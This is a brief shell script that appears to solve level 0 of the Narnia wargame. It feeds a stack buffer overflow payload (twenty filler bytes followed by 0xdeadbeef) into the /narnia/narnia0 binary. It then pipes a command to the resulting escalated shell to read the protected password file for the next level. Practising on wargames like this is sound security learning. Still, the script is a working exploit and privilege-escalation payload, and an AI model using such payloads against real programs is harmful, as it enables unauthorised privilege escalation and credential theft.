#!/bin/sh

# Buffer overflow attack (classic)
# Generate our program input via stdin:

# Our overflow value in ASCII format
(printf "aaaaaaaaaaaaaaaaaaaa$(printf 'efbeadde' | xxd -r -p)\n" && \

# Our command to run once narnia0 give us an escalated shell
printf "cat /etc/narnia_pass/narnia1\n") | \

# Pass exploit to the program
/narnia/narnia0

